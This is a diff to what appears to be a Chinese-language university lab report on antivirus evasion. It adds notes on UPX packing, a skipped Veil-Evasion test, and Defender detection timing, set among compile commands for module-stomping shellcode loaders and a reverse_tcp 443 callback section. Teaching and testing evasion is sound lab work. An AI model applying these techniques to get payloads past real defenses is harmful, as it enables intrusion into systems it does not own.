@@ -212,6 +212,7 @@ i686-w64-mingw32-gcc cs.c -o 你的学号_cs.exe</code></pre>
 <p>加壳结果：<strong>仍被检出，而且详情里明确标注了 <code>→(UPX)</code></strong>（14:28）。</p>
 <figure><img src="img/fig07.png" alt="图7 A 环境：加壳后的 cs_upx.exe 被检出，受影"><figcaption>图7 A 环境：加壳后的 cs_upx.exe 被检出，受影响项目明确写着 file: ...20242110_cs_upx.exe→(UPX)</figcaption></figure>
 <p>为什么加壳也救不了？两个原因：① UPX 是最知名的壳，<strong>壳本身的特征早已被收录</strong>（截图里的 <code>→(UPX)</code> 标注就是证据）；② 加壳后的高熵数据段会触发启发式检测。</p>
+<blockquote><strong>诚实备注：Veil-Evasion 我们没有做。</strong> 课件提到的这个自动化生成框架，两人都未实测——2026 版 Kali 上它依赖 wine、安装笨重、成功率低，且课件已给出实测结论：其生成物的特征同样被收录（历史检出 19/58）。相比之下，本文的手工组合路线不需要额外安装任何东西。若你的课程要求覆盖 Veil，“按课件口径评估后放弃”同样是一种有效的实测结论。</blockquote>
 <p>到这里，前四级全军覆没，死因汇总：</p>
 <div class="tbl"><div class="tcap">表5　前四级样本死因汇总</div>
 <table><thead><tr><th>样本</th><th>技术</th><th>结果</th><th>死因</th></tr></thead><tbody>
@@ -329,7 +330,7 @@ int main(void) {
     WaitForSingleObject(t, INFINITE);
     return 0;
 }</code></pre>
-<p>x64 变体 <code>你的学号exp64.c</code> 仅一处不同：<code>fopen("encoded64.txt", "r")</code>，其余完全一致。B 环境对两个变体分别编译（x64 版带 <code>-static</code> 静态链接）：</p>
+<p>x64 变体 <code>你的学号exp64.c</code> 仅一处不同：<code>fopen("encoded64.txt", "r")</code>，其余完全一致。多做一个 x64 变体不是重复劳动——它验证的是<strong>模块踩踏这套手法对 64 位 PE 同样成立</strong>（.text 段定位与 RW→RX 流程在 x64 结构下依然有效），也是第十节“UPX 加壳版回连”闭环的前提；实际攻防里 64 位目标才是主流，只做 x86 会把方法的有效性锁死在旧场景。B 环境对两个变体分别编译（x64 版带 <code>-static</code> 静态链接）：</p>
 <pre data-lang="bash"><code>i686-w64-mingw32-gcc 你的学号exp.c   -o 你的学号exp.exe              # x86 主线
 x86_64-w64-mingw32-gcc 你的学号exp64.c -o 你的学号exp64.exe -static  # x64 变体
 ls -l *.exe *.raw *.txt</code></pre>
@@ -343,6 +344,7 @@ wc -c sc64.raw encoded64.txt    # 应输出 841 / 1682——恰好 2 倍</code><
 <pre data-lang="bash"><code>cp 你的学号exp64.exe 你的学号exp64_upx.exe &amp;&amp; upx 你的学号exp64_upx.exe
 upx -l 你的学号exp64_upx.exe    # 复核压缩信息</code></pre>
 <figure><img src="img/fig10.png" alt="图10 B 环境：UPX 压缩踩踏版 x64 加载器成功，3"><figcaption>图10 B 环境：UPX 压缩踩踏版 x64 加载器成功，350906 → 182970 字节，为原体积的 52.14%（win64/pe）</figcaption></figure>
+<blockquote><strong>为什么会出现两次 UPX 实验？</strong> 它们回答的是两个不同的问题：第五节 A 给 <strong>cs.exe（内嵌载荷）</strong> 加壳，验证“加壳能不能救活必死样本”——不能，照样被抓；这里 B 给<strong>不含载荷的踩踏版加载器</strong>加壳，验证“加壳能不能与组件分离叠加”——能，且压缩到 52.14% 后功能完好（运行层闭环见「加壳版加载器的运行层验证」一节）。</blockquote>
 <p>加壳是否影响加载器功能、加壳版能否照常回连，「加壳版加载器的运行层验证」一节专门验证。</p>
 <h2 id="sec8"><span class="hn">八、</span>传输到靶机：tar + socat + MD5 校验（B 环境）</h2>
 <blockquote><strong>谁需要这一节？</strong> 按 A 的方式用共享文件夹操作的读者，文件已经直接落在 Windows 里，<strong>本节可跳过</strong>；在 Kali 家目录生成文件的读者（B 的方式）才需要下面的 tar + socat 传输。</blockquote>
@@ -367,6 +369,7 @@ dir C:\你的学号lab3</code></pre>
 <p><strong>B 环境</strong>：对加载器、加密文本、UPX 加壳版逐个自定义扫描，<code>Get-MpThreat</code> 无新增记录——全部 0 威胁：</p>
 <figure><img src="img/fig15.png" alt="图15 B 环境：三个组合免杀文件逐个 Start-MpSc"><figcaption>图15 B 环境：三个组合免杀文件逐个 Start-MpScan 自定义扫描 + Get-MpThreat 复核，0 威胁</figcaption></figure>
 <p>而对照组的下场前面已经亲眼看过了：图1/图2 落盘即杀、图3 遭隔离、图5/图7 连自编程序加壳都被抓。<strong>同一目录、同一杀软、同一时刻——五个“实心”样本全灭，两个“拆空”的文件安然无恙，静态免杀得证。</strong></p>
+<blockquote><strong>jar 为什么“多活了”几分钟？</strong> B 环境的时间线是：22:42 前后解包落盘 → 22:48 对照组 exe 弹窗 → 22:49 jar 遭隔离——jar 并没有逃过检测，只是排在队列后段。对比 A 环境（文件经共享文件夹写入，检出与写入发生在同一分钟）可知：实时保护的触发时机（写入即扫、访问触发、空闲扫描）与云查杀回调存在时间差，而 jar 归档还要先展开内部 class 结构、分析开销更大，自然更慢。<strong>“晚杀”不等于“没杀”——反过来，防御方同样不能指望“落盘即报”永远即时。</strong></blockquote>
 <h2 id="sec10"><span class="hn">十、</span>运行层：443 端口回连拿权限</h2>
 <p>静态过了，还要能跑。Kali 起监听（handler 的载荷、端口必须与生成时完全一致）：</p>
 <pre data-lang="bash"><code># A 环境主线：reverse_tcp 443（handler 载荷/端口必须与生成时一致）
